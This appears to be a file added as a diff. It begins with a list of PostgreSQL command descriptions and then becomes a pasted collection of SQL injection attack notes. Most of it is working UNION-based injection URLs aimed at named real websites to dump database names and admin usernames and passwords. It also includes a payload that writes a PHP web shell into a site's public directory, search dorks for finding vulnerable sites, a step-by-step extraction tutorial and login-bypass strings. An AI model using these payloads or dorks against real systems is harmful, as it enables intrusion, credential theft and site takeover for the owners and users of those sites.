+DROP TYPE -- remove a user-defined data type
+DROP USER -- remove a database user account
+DROP VIEW -- remove a view
+END -- commit the current transaction
+EXECUTE -- execute a prepared query
+EXPLAIN -- show the execution plan of a statement
+FETCH -- retrieve rows from a table using a cursor
+GRANT -- define access privileges
+INSERT -- create new rows in a table
+LISTEN -- listen for a notification
+LOAD -- load or reload a shared library file
+LOCK -- explicitly lock a table
+MOVE -- position a cursor on a specified row of a table
+NOTIFY -- generate a notification
+PREPARE -- create a prepared query
+REINDEX -- rebuild corrupted indexes
+RESET -- restore the value of a run-time parameter to a default value
+REVOKE -- remove access privileges
+ROLLBACK -- abort the current transaction
+SELECT -- retrieve rows from a table or view
+SELECT INTO -- create a new table from the results of a query
+SET -- change a run-time parameter
+SET CONSTRAINTS -- set the constraint mode of the current transaction
+SET SESSION AUTHORIZATION -- set the session user identifier and the current user identifier of the current session
+SET TRANSACTION -- set the characteristics of the current transaction
+SHOW -- show the value of a run-time parameter
+START TRANSACTION -- start a transaction block
+TRUNCATE -- empty a table
+UNLISTEN -- stop listening for a notification
+UPDATE -- update rows of a table
+VACUUM -- garbage-collect and optionally analyze a database
+
+
+
+
+http://www.wallistile.com/featured.php?id=-548  union select 1,2,3,4,5,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),7,8,9,10,11,12,1 ?3,14,15,16,17,18,19,20--
+
+
+.php?id=-1+union+select+1,2,3,4,5,'<?php @system($_REQUEST["cmd"]); ?>',6,7,8+INTO+DUMPFILE+'/home/username/public_html/images/shell.php'
+
+http://www.pixheaven.net/galerie_us.php?id=-3 union select 1,1,1,1,1,1,substring(@@version,1,1)=5,1,1-- f
+
+********************************************
+inurl:"php?id=" & intitle:"fucked"
+article_full.php?id=
+media.php?id=14358
+exp.php?ID=659
+view_video.php?id=19844
+
+Example of typical dork: inurl:"product.php?product_id="
+Example of a dork I would use: inurl:"view/products.php?ProdID=" & ".co.uk" & intext:"basket"
+
+inurl:"option=com_mytube"
+
+***************************
+
+union all select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x(hex value of "admin" here)--
+
+This will display the columns contained in table "admin".
+
+EDIT: sorry hac already answered ^_^. @op yes that is correct. 
+
+
+try this
+
+Code:
+http://www.lifeskillstraining.com/faq.php?id=null union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=0x703235336a376d6c5f6e687061--
+
+703235336a376d6c5f6e687061 = p253j7ml_nhpa in hex. p253j7ml_nhpa is a database in the site. I used this to get the database names.
+
+Code:
+http://www.lifeskillstraining.com/faq.php?id=null union select 1,group_concat(schema_name),3,4 from information_schema.schemata--
+
+
+Using database() gives you the "active" table, where as with using the query above you can see all the databases on the site, and specify which one you want to get the tables from.
+
+next, you'd get the columns like so
+
+Code:
+http://www.lifeskillstraining.com/faq.php?id=null union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x61646d696e--
+
+61646d696e = admin in hex.
+
+then finally, we get the username and password info, so we do
+
+Code:
+http://www.lifeskillstraining.com/faq.php?id=null union select 1,group_concat(username,0x3a,password),3,4 from admin--
+
+3a is a colon in hex. So its like username:password but you have to tell it in hex and you always need a 0x before any hex.
+
+NOTE: If you're getting tables from a different database thats not the active one (turns out this is the active database) you need to put the database in that query above too like this
+
+Code:
+http://www.lifeskillstraining.com/faq.php?id=null union select 1,group_concat(username,0x3a,password),3,4 from p253j7ml_nhpa.admin--
+
+(btw null is the same as -4 the - just nulls the number is it can be id=0, or id=null, or id=-99 they are all null) 
+
+
+
+**************************************************
+
+http://www.lifeskillstraining.com:2082
+
+
+*****************************************************************
+
+
+So once you have you'r site
+http://www.xxxx.com/index.php?catid=1
+now we add a ' to the end of the url
+so the site is
+http://www.xxxx.com/index.php?catid=1'
+if there is an error of some sort then it is vulnerable
+now we need to find the number of columns in the sql database
+so we type
+http://www.xxxx.com/index.php?catid=1 order by 1-- "no error"
+http://www.xxxx.com/index.php?catid=1 order by 2-- "no error"
+http://www.xxxx.com/index.php?catid=1 order by 3-- "no error"
+http://www.xxxx.com/index.php?catid=1 order by 4-- "no error"
+http://www.xxxx.com/index.php?catid=1 order by 5-- "error"
+
+so this database has 4 columns because we got an error on 5
+on some databases there is 2 columns and on some 200 it varies
+so once we have the column number.
+we try the union function
+http://www.xxxx.com/index.php?catid=1 union select 1,2,3,4-- "or whatever number of columns are in the database"
+if you see some numbers like 1 2 3 4 on the screen or the column names
+it might not show all numbers on the screen but the numbers displayed are the ones you can replace to extract info from the db
+so now we need to info about the db
+so lets say the numbers 2 and 4 showed up on the screen
+so i will use my query on 2
+http://www.xxxx.com/index.php?catid=1 union select 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3,4--
+the db type and version will pop up on the screen
+if the db version is 4 or lower then to extract the password you will need these queries
+http://www.xxxx.com/index.php?catid=-1 UNION SELECT 1,concat(table_name,CHAR(58),column_name,CHAR(58),table_schema) from information_schema.columns where column_name like CHAR(37, 112, 97, 115, 37),3,4--
+this should display the table containing the admin username and password
+but if not then you will have to guess the table
+so once you have your table "or not"
+then type
+http://www.xxxx.com/index.php?catid=1 UNION SELECT 1,password,3,4 FROM admintablename--
+where it says admintablename type the table you found with concat(table_name,CHAR(58),column_name,CHAR(58),table_schema) from information_schema.columns where column_name like CHAR(37, 112, 97, 115, 37)-- or your guess
+then once u have the right table name you should get the administrator password
+then just do the same thing but type username instead of password
+sometimes the password is hashed and you need to crack it.
+then see if you can get the admin panel if you cant then try the admin panel finder script here http://www.darkc0de.com/c0de/perl/admin_1.2_.txt
+now if the database is version 5 or up
+type
+http://www.xxxx.com/index.php?catid=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
+and that will display a list of all the tables
+once you have your table name
+type the same thing as 4
+http://www.xxxx.com/index.php?catid=1 UNION SELECT 1,password,3,4 FROM admintable--
+then the same with username
+but now if it doesnt work far all those things
+just tootoo around with all the little catid=1 or catid=-1 or instead of -- put /* or even nothing
+just play around with those
+but sometimes we also need to use the version() or version@@
+so sometimes UNION SELECT version (),password,3,4 FROM admintable--
+or UNION SELECT version @@,password,3,4 FROM admintable--
+
+
+&************************************************
+
+TO get all DBs use :-
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata--
+
+then convert DB name u want to get into to hex and add 0x before the hex
+
+then use
+
+the current query
+http://www.example.com/index.php?id=-3 union select group_concat(table_name),2,3,4,5,6,7 from information_schema.tables where table_schema=replace me with hex-- 
+
+
+
+*****************************************
+
+
+Try these steps:
+
+    * To gain access and find a user name.
+	'OR''='
+	
+	SELECT name from users WHERE name='' OR ''='' AND password='' OR ''=''
+
+	Enter the string as both user name and password in the frame on the right. This should get you logged in as a user (jake happens to be the first user in the table). This tells you that Jake is a user and it allows you to access his account - but it does not tell you his password.
+    * Find out if Jake's password includes the letter "w". Enter xxx as user name and enter the following string as the password: 
+	Does jake's password have a w in it?
+    ' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='
+Does jake's password start with w?
+    ' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE 'w%') AND ''='
+Does jake's password have an w followed by d?
+    ' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%d%') AND ''='
+Is the fourth letter of jake's password w?
+    ' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '___w%') AND ''=' 
+	
+	
+	' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='
+	
+	Are there more than 10 rows in the password table?
+    ' OR (SELECT COUNT(*) FROM users)>10 AND ''='
+Is there a user with an r in his name?
+    ' OR EXISTS(SELECT * FROM users WHERE name LIKE '%r%') AND ''='
+Is there a user (other than jake) with an a in his name?
+    ' OR EXISTS(SELECT * FROM users WHERE name!='jake' AND name LIKE '%a%') AND ''=' 
+	
+	
